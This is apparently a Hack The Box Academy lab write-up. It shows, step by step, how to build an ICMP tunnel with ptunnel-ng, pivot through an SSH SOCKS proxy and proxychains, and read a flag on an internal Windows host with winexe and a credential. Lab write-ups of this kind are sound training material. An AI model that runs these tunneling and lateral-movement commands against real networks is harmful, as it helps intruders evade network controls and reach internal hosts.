# ICMP Tunneling with SOCKS – Hack The Box Academy Write-Up

**Author:** Don Trabajo  
**Platform:** Hack The Box Academy  
**Module:** ICMP Tunneling with SOCKS  
**Objective:** Establish an ICMP tunnel using `ptunnel-ng`, pivot through a SOCKS5 proxy, and retrieve a flag from an internal host via proxychains.

---

## 🧰 Tools Used

- `ptunnel-ng`
- `ssh`
- `proxychains`
- `xfreerdp`, `winexe` (as fallback)
- `nmap`, `netcat`

---

## 🧱 Environment Setup

### 🔹 Clone & Build `ptunnel-ng` on Attack Host (Kali)
```bash
git clone https://github.com/utoni/ptunnel-ng.git
cd ptunnel-ng
sudo apt install automake autoconf -y
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
./autogen.sh
```

### 🔹 Transfer to Pivot (Target) Host
```bash
scp -r ptunnel-ng ubuntu@10.129.133.184:~/
```

---

## 🚪 Launching the Tunnel

### 🔹 On Pivot Host
```bash
cd ~/ptunnel-ng/src
sudo ./ptunnel-ng -r10.129.133.184 -R22
```

### 🔹 On Attack Host
```bash
cd ptunnel-ng/src
sudo ./ptunnel-ng -p10.129.133.184 -l2222 -r10.129.133.184 -R22
```

---

## 🔌 Creating the SOCKS Proxy

```bash
ssh -D 9050 -N -f -p2222 -lubuntu 127.0.0.1
```

> `-D 9050`: Local SOCKS5 proxy  
> `-N`: No shell  
> `-f`: Background mode

---

## 🔍 Verifying the Proxy

Update `/etc/proxychains4.conf`:
```ini
socks5 127.0.0.1 9050
```

Test it:
```bash
proxychains curl http://example.com
```

---

## 🎯 Pivot to Internal Network

### 🔹 Scan for RDP (Port 3389)
```bash
proxychains nmap -Pn -sT -sV -p3389 172.16.5.19
```

### 🔹 (Failed GUI Method) RDP via Proxy
```bash
proxychains xfreerdp /u:victor /p:"REDACTED_PASSWORD" /v:172.16.5.19
```
⚠️ Unreliable over ICMP + SOCKS

---

## 🪜 Successful Access via Winexe

### 🔹 Retrieve the Flag from Attack Host
```bash
proxychains winexe -U victor%REDACTED_PASSWORD //172.16.5.19 "cmd.exe /c type C:\Users\victor\Downloads\flag.txt"
```

🎉 **Flag captured successfully via full ICMP + SOCKS pivot!**

---

## 🧠 Key Lessons

- ICMP tunneling enables covert communication when traditional channels are blocked.
- SOCKS5 via SSH dynamic port forwarding is a flexible pivot method.
- Use lightweight CLI tools over GUI apps when proxying through complex tunnels.
- Monitor tunnel health and re-establish if behavior becomes unstable.

---

## 🏁 Mission Accomplished

This lab demonstrates covert access to a segmented internal host via ICMP tunnel + dynamic SOCKS proxy, achieving full lateral movement and exfiltration under constrained network controls.


